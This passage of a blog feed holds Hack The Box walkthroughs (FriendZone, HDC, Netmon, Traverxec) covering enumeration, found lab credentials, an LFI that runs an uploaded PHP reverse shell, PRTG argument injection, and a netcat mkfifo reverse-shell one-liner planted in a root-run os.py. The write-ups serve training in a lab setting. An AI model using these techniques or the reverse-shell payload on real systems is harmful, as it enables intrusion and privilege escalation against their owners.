&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-dig1.png&quot; alt=&quot;htb-friendzone-dig1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Looks like it is. Lets try and navigate to each one and see if it will uncover more clues.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;https:&#x2F;&#x2F;admin.friendzoneportal.red&lt;&#x2F;code&gt; is the only URL that is accessible.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-admin.png&quot; alt=&quot;htb-friendzone-admin&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I haven&#x27;t found any clues in regards to possible username and passwords. I tried the guessable combinations but no luck. Source code doesn&#x27;t show anything interesting.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I&#x27;m moving to the next service, Samba shares. &lt;code&gt;Enum4linux&lt;&#x2F;code&gt; shows the following shares are accessible:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-enum4linux.png&quot; alt=&quot;htb-friendzone-enum4linux&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Connecting to the general share shows there is a &lt;code&gt;creds.txt&lt;&#x2F;code&gt; file that contains:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;creds for the admin THING:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;admin:WORKWORKHhallelujah@#
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I guess this is the credentials I&#x27;m looking for the admin panel? Lets try.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-adminfail.png&quot; alt=&quot;htb-friendzone-adminfail&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Darn, now I&#x27;m stuck on what to do here.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I guess I have to move to the next service, 443. My &lt;code&gt;Nmap&lt;&#x2F;code&gt; scan shows the SSL cert with a domain name that wasn&#x27;t found on the main page:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-ssl.png&quot; alt=&quot;htb-friendzone-ssl&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;friendzone.red&lt;&#x2F;code&gt; domain?? I&#x27;ll have to enumerate this domain using dig after adding the domain to our hosts file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-dig2.png&quot; alt=&quot;htb-friendzone-dig2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;More domains has been uncovered. Lets see which one of these URLs lead to anything.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-administrator1.png&quot; alt=&quot;htb-friendzone-administrator1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Trying the same login that I found in &lt;code&gt;creds.txt&lt;&#x2F;code&gt;, it worked! It page tells us that I should navigate to a &lt;code&gt;dashboard.php&lt;&#x2F;code&gt; page that shows:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-dashboard.png&quot; alt=&quot;htb-friendzone-dashboard&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Navigating to the url shows us this:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id=a.jpg&amp;amp;pagename=timestamp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-imageparam.png&quot; alt=&quot;htb-friendzone-imageparam&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I proceeded to try and see if it&#x27;s vulnerable to LFI&#x2F;RFI but no luck. See if it&#x27;s vulnerable to PHP wrappers, no luck.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-lfi.png&quot; alt=&quot;htb-friendzone-lfi&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I began enumerating again using &lt;code&gt;dirsearch&lt;&#x2F;code&gt; on &lt;code&gt;administrator1.friendzone.red&lt;&#x2F;code&gt;. While that is running, I noticed &lt;code&gt;https:&#x2F;&#x2F;uploads.friendzone.red&#x2F;files&#x2F;&lt;&#x2F;code&gt; is accessible.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-uploads.png&quot; alt=&quot;htb-friendzone-uploads&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I tried uploading a php file with reverse shell code and a message indicates it has been “uploaded successfully”. I tried the possible ways of accessing this file stored somewhere but no where can be found even through Samba mapping. Is it possible that this form&#x27;s response is misleading? Pressing the upload button without a file attachment renders “upload successful” message as well. I believe this is a rabbit hole.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Going back to &lt;code&gt;dirsearch&lt;&#x2F;code&gt; results, it found a &lt;code&gt;timestamp.php&lt;&#x2F;code&gt; file. This is the file that renders the timestamp on the dashboard page.&lt;&#x2F;p&gt;
&lt;p&gt;After reading through my nmap scripts carefully, I noticed that the smb script found the paths where the file are being stored. The &lt;code&gt;development&lt;&#x2F;code&gt; share shows that the files are stored at &lt;code&gt;&#x2F;etc&#x2F;Development&lt;&#x2F;code&gt; folder.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-scriptpath.png&quot; alt=&quot;htb-friendzone-scriptpath&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I guess I can try to upload my reverse shell to development shared folder and try to LFI the path? I figure this would be a good guess because I know that the dashboard page tells us to load parameters to render the images and timestamp. I can only guess that the “pagename=” parameter can load other files.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;smbclient &#x2F;&#x2F;10.10.10.123&#x2F;development
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;put rs.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Navigating the url:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id=a.jpg&amp;amp;pagename=&#x2F;etc&#x2F;Development&#x2F;rs.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nada. Not sure why it&#x27;s not working. Taking a step back, look at how “timestamp” loads in the parameter, it doesn&#x27;t use a .php extension. Lets try without the php extension.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id=a.jpg&amp;amp;pagename=&#x2F;etc&#x2F;Development&#x2F;rs
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Tada, a successful low privilege shell to obtain user flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-userflag.png&quot; alt=&quot;htb-friendzone-userflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Ran the standard &lt;code&gt;linenum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; scripts, I noticed something unusual with this python script:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-ospy.png&quot; alt=&quot;htb-friendzone-ospy&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Why would an OS python module require 777? I&#x27;ll take a note of this just in case I need it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;While I&#x27;m digging through this system and see if there are useful information to be found, I located this credential file at &lt;code&gt;&#x2F;var&#x2F;www&#x2F;mysql_data.conf&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-mysqlcreds.png&quot; alt=&quot;htb-friendzone-mysqlcreds&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I tried using this credential to log into SSH and indeed it works. Full user shell has been achieved.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After spending some time on the system, I don&#x27;t see anything else that immediately stands out. Time to run &lt;code&gt;pspy64&lt;&#x2F;code&gt; and see what is running on the background.&lt;&#x2F;p&gt;
&lt;p&gt;After waiting awhile, I noticed there is a python scripts that runs as &lt;code&gt;UID=0&lt;&#x2F;code&gt; which is root account.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-pspy64.png&quot; alt=&quot;htb-friendzone-pspy64&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Taking a look at what the &lt;code&gt;reporter.py&lt;&#x2F;code&gt; script is about, it&#x27;s&#x27; importing the OS module as seen earlier.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-reporter.png&quot; alt=&quot;htb-friendzone-reporter&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is our ticket to run as root privileges as all I have to do is inject code into the &lt;code&gt;os.py&lt;&#x2F;code&gt; module as I have full privileges to the file and the &lt;code&gt;reporter.py&lt;&#x2F;code&gt; script doesn&#x27;t.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Inject this code at the very end of the &lt;code&gt;os.py&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.3 4444 &amp;gt;&#x2F;tmp&#x2F;f&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Wait for the cronjob to run and you should be able to get the reverse shell and obtain the root flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-pspyafter.png&quot; alt=&quot;htb-friendzone-pspyafter&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-friendzone&#x2F;htb-friendzone-rooted.png&quot; alt=&quot;htb-friendzone-rooted&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>HDC</title>
        <published>2019-07-03T00:00:00+00:00</published>
        <updated>2019-07-03T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-hdc/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-hdc/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;On the main page, it shows a simple login form. The first thing I did is browse around the source code and see if there are any hidden username and passwords. There are two js files, &lt;code&gt;jquery-3.2.1.js&lt;&#x2F;code&gt; and &lt;code&gt;myscripts.js&lt;&#x2F;code&gt; that I looked into.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-doprocess.png&quot; alt=&quot;htb-hdc-doprocess.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;myscripts.js&lt;&#x2F;code&gt; has a function named &lt;code&gt;doProcess()&lt;&#x2F;code&gt; which handles the submission I would imagine. Let&#x27;s take a look at what this function does in &lt;code&gt;jquery-3.2.1.js&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-jquery.png&quot;&gt;htb-hdc-jquery.png&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;{var form=document.createElement(&amp;quot;form&amp;quot;);	form.setAttribute(&amp;quot;method&amp;quot;,&amp;quot;post&amp;quot;);	form.setAttribute(&amp;quot;action&amp;quot;,&amp;quot;main&#x2F;index.php&amp;quot;);	form.setAttribute(&amp;quot;target&amp;quot;,&amp;quot;view&amp;quot;);	var hiddenField=document.createElement(&amp;quot;input&amp;quot;);	hiddenField.setAttribute(&amp;quot;type&amp;quot;,&amp;quot;hidden&amp;quot;);	hiddenField.setAttribute(&amp;quot;name&amp;quot;,&amp;quot;name1&amp;quot;);	hiddenField.setAttribute(&amp;quot;value&amp;quot;,&amp;quot;TXlMaXR0bGU&amp;quot;);	var hiddenField2=document.createElement(&amp;quot;input&amp;quot;);	hiddenField2.setAttribute(&amp;quot;type&amp;quot;,&amp;quot;hidden&amp;quot;);	hiddenField2.setAttribute(&amp;quot;name&amp;quot;,&amp;quot;name2&amp;quot;);	hiddenField2.setAttribute(&amp;quot;value&amp;quot;,&amp;quot;cDB3bmll&amp;quot;);	form.appendChild(hiddenField2);		form.appendChild(hiddenField);	form.appendChild(hiddenField2);	document.body.appendChild(form);			window.open(&amp;#39;&amp;#39;,&amp;#39;view&amp;#39;);	form.submit();}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Oh look, there is a &lt;code&gt;hiddenField&lt;&#x2F;code&gt; attribute set for username and password. This must be the ticket to log into the login page.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After logging, it shows that this platform is used for &amp;quot;Central Greece Station&amp;quot;. Whatever that means, it sounds important.. I think. Browsing around the displayed links, most are junk except two places that seems suspect.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-securityarea.png&quot; alt=&quot;htb-hdc-securityarea.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This security area seems like a good place to dig around. Let&#x27;s take a look at the source code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-secretarea.png&quot; alt=&quot;htb-hdc-secretarea.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Poking around, I eventually landed on a link that leads to a directory called &lt;code&gt;secret_area_&lt;&#x2F;code&gt;. Seems juicy, let&#x27;s take a look at what&#x27;s inside.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-mailstxt.png&quot; alt=&quot;htb-hdc-mailstxt.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A list of email addresses, I wonder what it can be possibly used for? Oh, there was a strange mail form that can be used to submit these email addresses, I guess we try it out?&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-mailform.png&quot; alt=&quot;htb-hdc-mailform.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Going through the first half of the list, we finally landed upon the root flag. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-hdc&#x2F;htb-hdc-rooted.png&quot; alt=&quot;htb-hdc-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Netmon</title>
        <published>2019-06-21T00:00:00+00:00</published>
        <updated>2019-06-21T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-netmon/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-netmon/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Nmap scans show FTP is open on port 21 with allowed anonymous access. Looking through the directories, I found the &lt;code&gt;user.txt&lt;&#x2F;code&gt; flag, that was way too easy.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-ftp.png&quot; alt=&quot;htb-netmon-ftp&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Nmap scans show Netmon is running a web server on port 80. The web server is hosting a web application called PRTG which is a network monitoring software. The version 18.1.37.13946 can be found below. Looking through exploit-db, there is no vulnerable exploits to be found.&lt;&#x2F;p&gt;
&lt;p&gt;Trying to figure out how to bypass the login, I&#x27;ve proceeded with brute forcing the login using &lt;code&gt;hydra&lt;&#x2F;code&gt; but no luck.&lt;&#x2F;p&gt;
&lt;p&gt;I started to dig through what else was on the system using FTP. I would find a hidden folder for PRTG located in:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;C:\ProgramData\Paessler|PRTG Network Monitor
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Inside this folder, there are old backup files and configuration files.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-oldbak.png&quot; alt=&quot;htb-netmon-oldbak.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Roaming through the configuration files, I found something that was notable. The configuration files contain passwords even if it was encrypted. I started to dig through all the configuration files that I could find and there was only 1 file that showed an unencrypted password.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-prtgconfig.png&quot; alt=&quot;htb-netmon-prtgconfig&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Username &lt;code&gt;prtgadmin&lt;&#x2F;code&gt; and password &lt;code&gt;PrTg@dmin2018&lt;&#x2F;code&gt;. I tried logging in with these credentials and it didn&#x27;t work. Not sure what to do next, so I got a hint from someone in Discord and they said try using the &lt;code&gt;PrTg@dmin2019&lt;&#x2F;code&gt; instead. Wow, it worked and something I would have never guessed. Enumerating passwords is something I will take note of next time.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once I&#x27;m logged in, I started to play around with PRTG as I never used this platform before. It was kind of confusing where everything is and how it works. After a while, I had a hunch that I had to create a sensor or something to trigger a script of some sort. I googled for possible code execution and I stumbled upon this site: &lt;code&gt;https:&#x2F;&#x2F;www.codewatch.org&#x2F;blog&#x2F;?p=453&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s smooth sailing from here following his instructions and modifying parts as my own. How it works is creating an EXE notification object that triggers the &lt;code&gt;Demo - Outfile.ps1&lt;&#x2F;code&gt;. Why &lt;code&gt;Outfile.ps1&lt;&#x2F;code&gt;? &lt;code&gt;Outfile.ps1&lt;&#x2F;code&gt; doesn&#x27;t sanitize the parameter being passed to it so you can append your own code for execution.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;if ($Args.Count -eq 0) {
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  #No Arguments. Filename must be specified.
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  exit 1;
&lt;&#x2F;span&gt;&lt;span&gt; }elseif ($Args.Count -eq 1){
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  $Path = split-path $Args[0];
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  if (Test-Path $Path)    
&lt;&#x2F;span&gt;&lt;span&gt;  {
&lt;&#x2F;span&gt;&lt;span&gt;    $Text = Get-Date;
&lt;&#x2F;span&gt;&lt;span&gt;    $Text | out-File $Args[0]; # This is where it doesn&amp;#39;t sanitize the parameter being passed to it
&lt;&#x2F;span&gt;&lt;span&gt;    exit 0;
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  }else
&lt;&#x2F;span&gt;&lt;span&gt;  {
&lt;&#x2F;span&gt;&lt;span&gt;    # Directory does not exist.
&lt;&#x2F;span&gt;&lt;span&gt;    exit 2;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Make a EXE notification with the parameters to read and output the flag to &lt;code&gt;C:\root.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-exenotification.png&quot; alt=&quot;htb-netmon-exenotification&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now you need to assign this notification object to an existing sensor. You can choose any sensor at this point and modify it&#x27;s notification setting to execute your EXE notification. I chose a sensor that was failing and assigned with these settings:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-editnotification.png&quot; alt=&quot;htb-netmon-editnotification&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;All you do now is watch and wait for the root flag file to be generated at &lt;code&gt;C:\&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-netmon&#x2F;htb-netmon-root.png&quot; alt=&quot;htb-netmon-root&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Traverxec</title>
        <published>2019-06-21T00:00:00+00:00</published>
        <updated>2019-06-21T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-traverxec/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-traverxec/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt; scans show port 22 and 80 is opened. Port 80 displays a basic bootstrap template and nothing stands out in the source code when inspected. After checking out the &lt;code&gt;nmap&lt;&#x2F;code&gt; results in detail, I noticed the HTTP server header displays &lt;code&gt;nostromo 1.9.6&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After researching what nostromo server is about, it&#x27;s a lightweight http server. Searching for existing exploits show it&#x27;s vulnerable to a &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;47573&quot;&gt;directory traversal remote code execution&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Run Metasploit and execute the vulnerability. If you see nothing on your screen, wait a few seconds for a session to establish.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-msf.png&quot; alt=&quot;htb-traverxec-msf.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;python&lt;&#x2F;code&gt; to create an interactive shell.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;python -c &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;import pty;pty.spawn(&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After enumerating the machine using &lt;code&gt;linenum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; scripts, I found an &lt;code&gt;.htaccess&lt;&#x2F;code&gt; file hidden away at &lt;code&gt;&#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The file contains an md5 hash for the user david: &lt;code&gt;$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Cracking the hash using &lt;code&gt;hastcat&lt;&#x2F;code&gt; and rockyou wordlist.&lt;&#x2F;p&gt;
